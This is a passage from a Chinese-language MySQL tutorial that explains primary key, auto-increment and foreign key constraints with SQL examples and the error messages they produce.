<h3 id="primary-key-constraint">PRIMARY KEY Constraint</h3>
<blockquote>
<p><strong>Entity integrity</strong> is concerned with ensuring that each row of a table has a unique and non-null primary key value; this is the same as saying that each row in a table represents a single instance of the entity type modelled by the table. <a href="https://en.wikipedia.org/wiki/Entity_integrity">wiki</a></p>
</blockquote>
<p>&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x7528;&#x6765;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x8868;&#x4E2D;&#x7684;&#x6BCF;&#x6761;&#x8BB0;&#x5F55;&#x3002;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x76F8;&#x5F53;&#x4E8E;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x4E0E;&#x975E;&#x7A7A;&#x7EA6;&#x675F;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x5217;&#x4E0D;&#x5141;&#x8BB8;&#x91CD;&#x590D;&#xFF0C;&#x4E5F;&#x4E0D;&#x5141;&#x8BB8;&#x51FA;&#x73B0;&#x7A7A;&#x503C;&#x3002;</p>
<p>&#x4E00;&#x5F20;&#x8868;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x53EF;&#x4EE5;&#x5728;&#x5217;&#x7EA7;&#x521B;&#x5EFA;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x8868;&#x7EA7;&#x521B;&#x5EFA;&#x3002;</p>
<p>&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x5BF9;&#x5E94;&#x7740;&#x8868;&#x4E2D;&#x7684;&#x4E00;&#x5217;&#x6216;&#x8005;&#x591A;&#x5217;&#xFF08;&#x590D;&#x5408;&#x4E3B;&#x952E;&#xFF09;&#x3002;&#x5982;&#x679C;&#x662F;&#x591A;&#x5217;&#x7EC4;&#x5408;&#x7684;&#x590D;&#x5408;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E9B;&#x5217;&#x90FD;&#x4E0D;&#x5141;&#x8BB8;&#x4E3A;&#x7A7A;&#x503C;&#xFF0C;&#x5E76;&#x4E14;&#x7EC4;&#x5408;&#x7684;&#x503C;&#x4E0D;&#x5141;&#x8BB8;&#x91CD;&#x590D;&#x3002;</p>
<p>&#x81EA;&#x884C;&#x547D;&#x540D;&#x7684;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x540D;&#x65E0;&#x6548;&#x3002;&#x5F53;&#x521B;&#x5EFA;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x5728;&#x6307;&#x5B9A;&#x5217;&#x6216;&#x5217;&#x7EC4;&#x5408;&#x4E0A;&#x5EFA;&#x7ACB;&#x5BF9;&#x5E94;&#x7684;&#x4E3B;&#x952E;&#x7D22;&#x5F15;&#x3002;</p>
<p>&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x5220;&#x9664;&#x65F6;&#xFF0C;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x7D22;&#x5F15;&#x4E5F;&#x4F1A;&#x81EA;&#x52A8;&#x5220;&#x9664;&#x3002;&#x6CE8;&#x610F;&#xFF1A;&#x4FEE;&#x6539;&#x4E3B;&#x952E;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x7834;&#x574F;&#x6570;&#x636E;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x3002;</p>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0;&#x7EA6;&#x675F;
# &#x5217;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE test3 (id INT PRIMARY KEY,last_name VARCHAR(15),salary DECIMAL(10,2),email VARCHAR(25));
# &#x8868;&#x7EA7;&#x7EA6;&#x675F; =&gt; &#x6CA1;&#x6709;&#x5FC5;&#x8981;&#x8D77;&#x540D;
mysql&gt; CREATE TABLE test4 (id INT,last_name VARCHAR(15),salary DECIMAL(10,2),email VARCHAR(25),CONSTRAINT pk_test4_id PRIMARY KEY(id));
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;test4&apos;;
mysql&gt; INSERT INTO test4 VALUES(1,&apos;zs&apos;,99999,&apos;zs@mail.com&apos;);
mysql&gt; INSERT INTO test4 VALUES(1,&apos;zscopy&apos;,99999,&apos;zscopy@mail.com&apos;);
ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;test4.PRIMARY&apos;
mysql&gt; INSERT INTO test4 VALUES(NULL,&apos;zscopy&apos;,99999,&apos;zscopy@mail.com&apos;);
ERROR 1048 (23000): Column &apos;id&apos; cannot be null
</code></pre>
<pre><code class="language-sql"># &#x590D;&#x5408;&#x4E3B;&#x952E;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE test5(id INT,`name` VARCHAR(15),`password` VARCHAR(25),PRIMARY KEY (`name`,`password`));
mysql&gt; INSERT INTO test5 VALUES (1,&apos;zs&apos;,&apos;abc&apos;);
mysql&gt; INSERT INTO test5 VALUES (1,&apos;zscopy&apos;,&apos;abc&apos;);
# &#x591A;&#x5217;&#x7EC4;&#x5408;&#x7684;&#x590D;&#x5408;&#x4E3B;&#x952E;&#x7EA6;&#x675F;&#x90FD;&#x4E0D;&#x53EF;&#x4EE5;&#x4E3A;NULL
mysql&gt; INSERT INTO test5 VALUES (1,NULL,&apos;abc&apos;);
ERROR 1048 (23000): Column &apos;name&apos; cannot be null
</code></pre>
<pre><code class="language-sql">/* &#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x7EA6;&#x675F; */
mysql&gt; CREATE TABLE test6(id INT,`name` VARCHAR(15),`password` VARCHAR(25));
mysql&gt; ALTER table test6 ADD PRIMARY KEY (id);
mysql&gt; DESC test6;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | int         | NO   | PRI | NULL    |       |
| name     | varchar(15) | YES  |     | NULL    |       |
| password | varchar(25) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
</code></pre>
<pre><code class="language-sql"># &#x5220;&#x9664;&#x4E3B;&#x952E;&#x7EA6;&#x675F; =&gt; &#x5B9E;&#x9645;&#x5F00;&#x53D1;&#x6839;&#x672C;&#x4E0D;&#x4F1A;&#x53BB;&#x505A;
ALTER TABLE &#x8868;&#x540D;&#x79F0; DROP PRIMARY KEY;
</code></pre>
<h3 id="autoincrement">AUTO_INCREMENT</h3>
<p>&#x81EA;&#x589E;&#x7279;&#x6027;&#x53EF;&#x4EE5;&#x8BA9;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x540E;&#x7EED;&#x63D2;&#x5165;&#x503C;&#x81EA;&#x589E;&#x3002;</p>
<p>&#x82E5;&#x5BF9;&#x4E3B;&#x952E;&#x8BBE;&#x7F6E;&#x81EA;&#x589E;&#xFF0C;&#x540E;&#x7EED;&#x5199; SQL &#x65F6;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x518D;&#x6807;&#x8BB0;&#x51FA;&#x4E3B;&#x952E;&#x5217;&#x4E86;&#x3002;</p>
<p>&#x4E00;&#x5F20;&#x8868;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x6709;&#x4E00;&#x4E2A;&#x81EA;&#x589E;&#x5217;&#x3002;&#x5F53;&#x9700;&#x8981;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#x6216;&#x987A;&#x5E8F;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x81EA;&#x589E;&#x3002;</p>
<p>&#x81EA;&#x589E;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x5FC5;&#x987B;&#x662F;&#x952E;&#xFF1A;&#x4E3B;&#x952E;&#x6216;&#x8005;&#x552F;&#x4E00;&#x952E;&#x3002;</p>
<p>&#x81EA;&#x589E;&#x7EA6;&#x675F;&#x7684;&#x5217;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x662F;&#x6574;&#x6570;&#x7C7B;&#x578B;&#xFF1A;</p>
<ul>
<li>&#x82E5;&#x81EA;&#x589E;&#x5217;&#x6307;&#x5B9A;&#x4E86; 0 &#x548C; null&#xFF1A;&#x5728;&#x5F53;&#x524D;&#x6700;&#x5927;&#x503C;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x81EA;&#x589E;</li>
<li>&#x82E5;&#x81EA;&#x589E;&#x5217;&#x6307;&#x5B9A;&#x4E86;&#x5177;&#x4F53;&#x503C;&#xFF1A;&#x76F4;&#x63A5;&#x8D4B;&#x503C;&#x4E3A;&#x5177;&#x4F53;&#x503C;</li>
</ul>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x8868;&#x65F6;&#x81EA;&#x589E;
mysql&gt; CREATE TABLE test7 (id INT PRIMARY KEY AUTO_INCREMENT, last_name VARCHAR(15));
mysql&gt; INSERT INTO test7(last_name) VALUES (&apos;zs&apos;);
mysql&gt; SELECT * FROM test7;
+----+-----------+
| id | last_name |
+----+-----------+
|  1 | zs        |
+----+-----------+
</code></pre>
<pre><code class="language-sql"># &#x521B;&#x5EFA;&#x8868;&#x540E;&#x81EA;&#x589E;
alter table &#x8868;&#x540D;&#x79F0; modify &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B; auto_increment;
mysql&gt; CREATE TABLE test8 (id INT PRIMARY KEY, last_name VARCHAR(15));
mysql&gt; ALTER TABLE TEST8 MODIFY ID INT AUTO_INCREMENT;
</code></pre>
<pre><code class="language-sql"># &#x5220;&#x9664;&#x81EA;&#x589E;
alter table &#x8868;&#x540D;&#x79F0; modify &#x5B57;&#x6BB5;&#x540D; &#x6570;&#x636E;&#x7C7B;&#x578B;;
mysql&gt; ALTER TABLE test8 MODIFY id INT;
</code></pre>
<p>MySQL 8.0 &#x65B0;&#x7279;&#x6027;&#xFF1A;&#x81EA;&#x589E;&#x53D8;&#x91CF;&#x7684;&#x6301;&#x4E45;&#x5316;</p>
<p>MySQL 8.0 &#x4E4B;&#x524D;&#xFF0C;InnoDB &#x4E0D;&#x80FD;&#x6062;&#x590D;&#x91CD;&#x542F;&#x524D;&#x7684;&#x81EA;&#x589E;&#x5217;&#x3002;</p>
<pre><code class="language-sql"># MySQL 5.7
mysql&gt; CREATE TABLE test9(id INT PRIMARY KEY AUTO_INCREMENT);
mysql&gt; INSERT INTO test9 VALUES (0),(0),(0),(0);
mysql&gt; SELECT * FROM test9;
mysql&gt; DELETE FROM test9 WHERE id = 4;
mysql&gt; INSERT INTO test9 VALUES(0);
mysql&gt; SELECT * FROM test9;
mysql&gt; DELETE FROM test9 where id=5;
# --- &#x6B64;&#x65F6;&#x91CD;&#x542F;&#x6570;&#x636E;&#x5E93; ---
# --- &#x65B0;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x7A7A;&#x503C; ---
mysql&gt; INSERT INTO test1 values(0);
# &#x65B0;&#x63D2;&#x5165;&#x7684; 0 &#x503C;&#x5206;&#x914D;&#x7684;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x503C;&#x662F; 4 =&gt; &#x6309;&#x91CD;&#x542F;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#x903B;&#x8F91;&#x5E94;&#x8BE5;&#x5206;&#x914D; 6
mysql&gt; SELECT * FROM test1;
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
|  4 |
+----+
</code></pre>
<p>MySQL 5.7 &#x4E2D;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x7684;&#x5206;&#x914D;&#x53D6;&#x51B3;&#x4E8E; InnoDB &#x6570;&#x636E;&#x5B57;&#x5178;&#x5185;&#x90E8;&#x7684;&#x4E00;&#x4E2A;&#x8BA1;&#x6570;&#x5668;&#xFF1A;</p>
<p>&#x8BE5;&#x8BA1;&#x6570;&#x5668;&#x53EA;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7EF4;&#x62A4;&#xFF0C;&#x5E76;&#x4E0D;&#x4F1A;&#x6301;&#x4E45;&#x5316;&#x5230;&#x78C1;&#x76D8;&#x3002;&#x5F53;&#x6570;&#x636E;&#x5E93;&#x91CD;&#x542F;&#x65F6;&#xFF0C;&#x8BE5;&#x8BA1;&#x6570;&#x5668;&#x4F1A;&#x88AB;&#x521D;&#x59CB;&#x5316;&#x3002;</p>
<p>MySQL 8.0 &#x540E;&#xFF0C;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x7684;&#x8BA1;&#x6570;&#x5668;&#x4F1A;&#x6301;&#x4E45;&#x5316;&#x5230;&#x91CD;&#x505A;&#x65E5;&#x5FD7;&#x4E2D;&#xFF1A;</p>
<p>&#x6BCF;&#x6B21;&#x8BA1;&#x6570;&#x5668;&#x53D1;&#x751F;&#x6539;&#x53D8;&#xFF0C;&#x90FD;&#x4F1A;&#x5C06;&#x6539;&#x53D8;&#x5199;&#x5165;&#x91CD;&#x505A;&#x65E5;&#x5FD7;&#x3002;&#x6570;&#x636E;&#x5E93;&#x91CD;&#x542F;&#x65F6;&#xFF0C;InnoDB &#x4F1A;&#x6839;&#x636E;&#x91CD;&#x505A;&#x65E5;&#x5FD7;&#x6240;&#x4FDD;&#x5B58;&#x7684;&#x4FE1;&#x606F;&#x6765;&#x521D;&#x59CB;&#x5316;&#x8BA1;&#x6570;&#x5668;&#x7684;&#x5185;&#x5B58;&#x503C;&#x3002;</p>
<h3 id="foreign-key-constraint">FOREIGN KEY Constraint</h3>
<blockquote>
<p>MySQL supports foreign keys, which permit cross-referencing related data across tables, and foreign key constraints, which help keep the related data consistent. <a href="https://dev.mysql.com/doc/refman/5.6/en/create-table-foreign-keys.html">dev.mysql</a><br>
A foreign key relationship involves a parent table that holds the initial column values, and a child table with column values that reference the parent column values. A foreign key constraint is defined on the child table.</p>
</blockquote>
<p>&#x5916;&#x952E;&#x662F;&#x4E00;&#x5F20;&#x8868;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x6216;&#x67D0;&#x4E9B;&#x5B57;&#x6BB5;&#x96C6;&#x5408;&#xFF0C;&#x8FD9;&#x4E9B;&#x5B57;&#x6BB5;&#x5176;&#x5B9E;&#x662F;&#x5176;&#x4ED6;&#x8868;&#x4E2D;&#x7684;&#x4E3B;&#x952E;&#x3002;</p>
<p>&#x4E3B;&#x8868;&#x5373;&#x7236;&#x8868;&#xFF0C;&#x662F;&#x88AB;&#x5F15;&#x7528;&#x53C2;&#x8003;&#x7684;&#x8868;&#xFF1B;&#x4ECE;&#x8868;&#x5373;&#x5B50;&#x8868;&#xFF0C;&#x662F;&#x5F15;&#x7528;&#x522B;&#x4EBA;&#x7684;&#x8868;&#x3002;</p>
<p>&#x4ECE;&#x8868;&#x7684;&#x5916;&#x952E;&#x5217;&#xFF0C;&#x5FC5;&#x987B;&#x5F15;&#x7528;&#x4E3B;&#x8868;&#x7684;&#x4E3B;&#x952E;&#x6216;&#x8005;&#x552F;&#x4E00;&#x7EA6;&#x675F;&#x7684;&#x5217;&#xFF0C;&#x56E0;&#x4E3A;&#x88AB;&#x4F9D;&#x8D56;&#x7684;&#x503C;&#x5FC5;&#x987B;&#x662F;&#x552F;&#x4E00;&#x7684;&#x3002;</p>
<p>&#x5728;&#x521B;&#x5EFA;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x82E5;&#x4E0D;&#x7ED9;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x547D;&#x540D;&#xFF0C;&#x9ED8;&#x8BA4;&#x540D;&#x4E0D;&#x662F;&#x5217;&#x540D;&#xFF0C;&#x800C;&#x662F;&#x81EA;&#x52A8;&#x4EA7;&#x751F;&#x7684;&#x4E00;&#x4E2A;&#x5916;&#x952E;&#x540D;&#x3002;</p>
<p>&#x521B;&#x5EFA;&#x8868;&#x65F6;&#x5C31;&#x6307;&#x5B9A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x7684;&#x8BDD;&#xFF0C;&#x5E94;&#x8BE5;&#x5148;&#x521B;&#x5EFA;&#x4E3B;&#x8868;&#xFF0C;&#x518D;&#x521B;&#x5EFA;&#x4ECE;&#x8868;&#x3002;&#x5728;&#x5220;&#x9664;&#x8868;&#x65F6;&#xFF0C;&#x5E94;&#x8BE5;&#x5148;&#x5220;&#x9664;&#x4ECE;&#x8868;&#x6216;&#x8005;&#x5148;&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x518D;&#x5220;&#x9664;&#x4E3B;&#x8868;&#x3002;</p>
<p>&#x4E00;&#x4E2A;&#x8868;&#x53EF;&#x4EE5;&#x5EFA;&#x7ACB;&#x591A;&#x4E2A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x3002;</p>
<p>&#x4ECE;&#x8868;&#x7684;&#x5916;&#x952E;&#x5217;&#x4E0E;&#x4E3B;&#x8868;&#x7684;&#x88AB;&#x53C2;&#x7167;&#x5217;&#x540D;&#x5B57;&#x53EF;&#x4EE5;&#x4E0D;&#x76F8;&#x540C;&#xFF0C;&#x4F46;&#x662F;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x5FC5;&#x987B;&#x4E00;&#x6837;&#x3002;&#x5982;&#x679C;&#x7C7B;&#x578B;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x521B;&#x5EFA;&#x5B50;&#x8868;&#x65F6;&#xFF0C;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x9519;&#x8BEF; &quot;ERROR 1005 (HY000)&quot;&#x3002;</p>
<p>&#x8BBE;&#x7F6E;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x65F6;&#xFF0C;&#x7CFB;&#x7EDF;&#x4F1A;&#x9ED8;&#x8BA4;&#x5EFA;&#x7ACB;&#x5BF9;&#x5E94;&#x7684;&#x666E;&#x901A;&#x7D22;&#x5F15;&#xFF0C;&#x7D22;&#x5F15;&#x540D;&#x662F;&#x5916;&#x952E;&#x7684;&#x7EA6;&#x675F;&#x540D;&#x3002;&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x540E;&#xFF0C;&#x5FC5;&#x987B;&#x624B;&#x52A8;&#x5220;&#x9664;&#x5BF9;&#x5E94;&#x7684;&#x7D22;&#x5F15;&#x3002;</p>
<pre><code class="language-sql">/* &#x5728;&#x521B;&#x5EFA;&#x8868;&#x65F6;&#x6DFB;&#x52A0; */
# &#x521B;&#x5EFA;&#x4E3B;&#x8868;&#x4E0E;&#x4ECE;&#x8868; -- &#x8868;&#x7EA7;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE dept1(dept_id INT,dept_name VARCHAR(15));
mysql&gt; CREATE TABLE emp1(emp_id INT PRIMARY KEY AUTO_INCREMENT,emp_name VARCHAR(15),department_id INT,CONSTRAINT fk_emp1_dept_id FOREIGN KEY (department_id) REFERENCES dept1(dept_id)); # ERROR 1822 (HY000): Failed to add the foreign key constraint. Missing index for constraint &apos;fk_emp1_dept_id&apos; in the referenced table &apos;dept1&apos;
# &#x62A5;&#x9519;&#x539F;&#x56E0;&#x662F;&#x4E3B;&#x8868;&#x6CA1;&#x6709;&#x4E3B;&#x952E;&#x7EA6;&#x675F; =&gt; &#x5B8C;&#x6210;&#x4E3B;&#x952E;&#x6DFB;&#x52A0;&#x540E;&#x518D;&#x8FDB;&#x884C;&#x4ECE;&#x8868;&#x521B;&#x5EFA;
mysql&gt; ALTER TABLE dept1 ADD PRIMARY KEY (dept_id);
</code></pre>
<pre><code class="language-sql"># &#x4E0D;&#x80FD;&#x6DFB;&#x52A0;&#x4E3B;&#x8868;&#x4E2D;&#x6CA1;&#x6709;&#x7684;&#x5B57;&#x6BB5;&#x503C; =&gt; &#x5148;&#x5411;&#x4E3B;&#x8868;&#x6DFB;&#x52A0;&#x518D;&#x5411;&#x4ECE;&#x8868;&#x6DFB;&#x52A0;
mysql&gt; INSERT INTO emp1 VALUES (1001,&apos;zs&apos;,10); # ERROR 1452 (23000): Cannot add or update a child row: a foreign key constraint fails (`dbtest13`.`emp1`, CONSTRAINT `fk_emp1_dept_id` FOREIGN KEY (`department_id`) REFERENCES `dept1` (`dept_id`))
mysql&gt; INSERT INTO dept1 VALUES (10, &apos;IT&apos;);
</code></pre>
<pre><code class="language-sql"># &#x5220;&#x9664;&#x3001;&#x66F4;&#x65B0;&#x5931;&#x8D25; =&gt; &#x5916;&#x952E;&#x7EA6;&#x675F;&#x8D77;&#x4F5C;&#x7528;
mysql&gt; DELETE FROM dept1 WHERE dept_id = 10; # ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails (`dbtest13`.`emp1`, CONSTRAINT `fk_emp1_dept_id` FOREIGN KEY (`department_id`) REFERENCES `dept1` (`dept_id`))
mysql&gt; UPDATE dept1 SET dept_id = 20 WHERE dept_id = 10; # ERROR 1451 (23000): Cannot delete or update a parent row: a foreign key constraint fails (`dbtest13`.`emp1`, CONSTRAINT `fk_emp1_dept_id` FOREIGN KEY (`department_id`) REFERENCES `dept1` (`dept_id`))
</code></pre>
<pre><code class="language-sql"># &#x5728;&#x521B;&#x5EFA;&#x8868;&#x540E;&#x6DFB;&#x52A0;&#x5916;&#x952E;&#x7EA6;&#x675F;
mysql&gt; CREATE TABLE dept2(dept_id INT PRIMARY KEY,dept_name VARCHAR(15));
mysql&gt; CREATE TABLE emp2(emp_id INT PRIMARY KEY AUTO_INCREMENT,emp_name VARCHAR(15),department_id INT);
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;emp2&apos;;
mysql&gt; ALTER TABLE emp2 ADD CONSTRAINT fk_emp2_dept2_id FOREIGN KEY (department_id) REFERENCES dept2(dept_id);
mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;emp2&apos;;
</code></pre>
<p>&#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF1A;</p>
<ol>
<li>&#x67E5;&#x770B;&#x7EA6;&#x675F;&#x540D; + &#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;</li>
<li>&#x67E5;&#x770B;&#x7D22;&#x5F15;&#x540D; + &#x5220;&#x9664;&#x7D22;&#x5F15;</li>
</ol>
<pre><code class="language-sql">SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;&#x8868;&#x540D;&#x79F0;&apos;; # &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x8868;&#x7684;&#x7EA6;&#x675F;&#x540D;
ALTER TABLE &#x4ECE;&#x8868;&#x540D; DROP FOREIGN KEY &#x5916;&#x952E;&#x7EA6;&#x675F;&#x540D;;
SHOW INDEX FROM &#x8868;&#x540D;&#x79F0;; # &#x67E5;&#x770B;&#x67D0;&#x4E2A;&#x8868;&#x7684;&#x7D22;&#x5F15;&#x540D;
ALTER TABLE &#x4ECE;&#x8868;&#x540D; DROP INDEX &#x7D22;&#x5F15;&#x540D;;
</code></pre>
<pre><code class="language-sql">mysql&gt; SELECT * FROM information_schema.table_constraints WHERE table_name = &apos;emp1&apos;;
mysql&gt; ALTER TABLE emp1 DROP FOREIGN KEY fk_emp1_dept_id; # &#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;
mysql&gt; ALTER TABLE emp1 DROP INDEX fk_emp1_dept_id; # &#x5220;&#x9664;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x5BF9;&#x5E94;&#x666E;&#x901A;&#x7D22;&#x5F15;
</code></pre>
<p>&#x7EA6;&#x675F;&#x7B49;&#x7EA7;&#xFF1A;</p>
<ol>
<li>Cascade&#xFF1A;&#x7236;&#x8868;&#x4E0A;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x65F6;&#xFF0C;&#x5B50;&#x8868;&#x540C;&#x6B65;&#x64CD;&#x4F5C;&#x5339;&#x914D;&#x8BB0;&#x5F55;</li>
<li>Set null&#xFF1A;&#x7236;&#x8868;&#x4E0A;&#x66F4;&#x65B0;&#x3001;&#x5220;&#x9664;&#x8BB0;&#x5F55;&#x65F6;&#xFF0C;&#x5B50;&#x8868;&#x4E0A;&#x5339;&#x914D;&#x8BB0;&#x5F55;&#x7684;&#x5217;&#x8BBE;&#x4E3A; null</li>
<li>No action&#xFF1A;&#x82E5;&#x5B50;&#x8868;&#x4E2D;&#x6709;&#x5339;&#x914D;&#x7684;&#x8BB0;&#x5F55;&#xFF0C;&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x5BF9;&#x7236;&#x8868;&#x76F8;&#x5173;&#x952E;&#x64CD;&#x4F5C;</li>
<li>Restrict&#xFF1A;&#x540C; no action&#xFF0C;&#x7ACB;&#x5373;&#x68C0;&#x67E5;&#x5916;&#x952E;&#x7EA6;&#x675F;</li>
<li>Set default&#xFF1A;&#x7236;&#x8868;&#x53D8;&#x66F4;&#x65F6;&#xFF0C;&#x5B50;&#x8868;&#x5C06;&#x5916;&#x952E;&#x5217;&#x8BBE;&#x7F6E;&#x6210;&#x9ED8;&#x8BA4;&#x7684;&#x503C;&#xFF08;Innodb &#x4E0D;&#x8BC6;&#xFF09;</li>
<li>&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x7B49;&#x7EA7;&#x76F8;&#x5F53;&#x4E8E; Restrict</li>
<li>&#x5916;&#x952E;&#x7EA6;&#x675F;&#x6700;&#x597D;&#x91C7;&#x7528; ON UPDATE CASCADE ON DELETE RESTRICT</li>
</ol>
<blockquote>
<p>&#x5728; MySQL &#x91CC;&#xFF0C;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x662F;&#x6709;&#x6210;&#x672C;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x6D88;&#x8017;&#x7CFB;&#x7EDF;&#x8D44;&#x6E90;&#x3002;&#x5BF9;&#x4E8E;&#x5927;&#x5E76;&#x53D1;&#x7684; SQL &#x64CD;&#x4F5C;&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x4F1A;&#x4E0D;&#x9002;&#x5408;&#x3002;&#x6BD4;&#x5982;&#x5927;&#x578B;&#x7F51;&#x7AD9;&#x7684;&#x4E2D;&#x592E;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x56E0;&#x4E3A;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x7684;&#x7CFB;&#x7EDF;&#x5F00;&#x9500;&#x800C;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x6162;&#x3002;&#x6240;&#x4EE5;&#xFF0C; MySQL &#x5141;&#x8BB8;&#x4E0D;&#x4F7F;&#x7528;&#x7CFB;&#x7EDF;&#x81EA;&#x5E26;&#x7684;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x9762;&#x5B8C;&#x6210;&#x68C0;&#x67E5;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x903B;&#x8F91;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x5373;&#x4F7F;&#x4E0D;&#x7528;&#x5916;&#x952E;&#x7EA6;&#x675F;&#xFF0C;&#x4E5F;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x5C42;&#x9762;&#x7684;&#x9644;&#x52A0;&#x903B;&#x8F91;&#xFF0C;&#x6765;&#x5B9E;&#x73B0;&#x5916;&#x952E;&#x7EA6;&#x675F;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x786E;&#x4FDD;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;</p>
<p>&#x300A;&#x963F;&#x91CC;&#x5F00;&#x53D1;&#x89C4;&#x8303;&#x300B;<br>
&#x3010;&#x5F3A;&#x5236;&#x3011;&#x4E0D;&#x5F97;&#x4F7F;&#x7528;&#x5916;&#x952E;&#x4E0E;&#x7EA7;&#x8054;&#xFF0C;&#x4E00;&#x5207;&#x5916;&#x952E;&#x6982;&#x5FF5;&#x5FC5;&#x987B;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x89E3;&#x51B3;&#x3002;</p>
<p>&#x8BF4;&#x660E;&#xFF1A;&#xFF08;&#x6982;&#x5FF5;&#x89E3;&#x91CA;&#xFF09;&#x5B66;&#x751F;&#x8868;&#x4E2D;&#x7684; student_id &#x662F;&#x4E3B;&#x952E;&#xFF0C;&#x90A3;&#x4E48;&#x6210;&#x7EE9;&#x8868;&#x4E2D;&#x7684; student_id &#x5219;&#x4E3A;&#x5916;&#x952E;&#x3002;&#x5982;&#x679C;&#x66F4;&#x65B0;&#x5B66;&#x751F;&#x8868;&#x4E2D;&#x7684; student_id&#xFF0C;&#x540C;&#x65F6;&#x89E6;&#x53D1;&#x6210;&#x7EE9;&#x8868;&#x4E2D;&#x7684; student_id 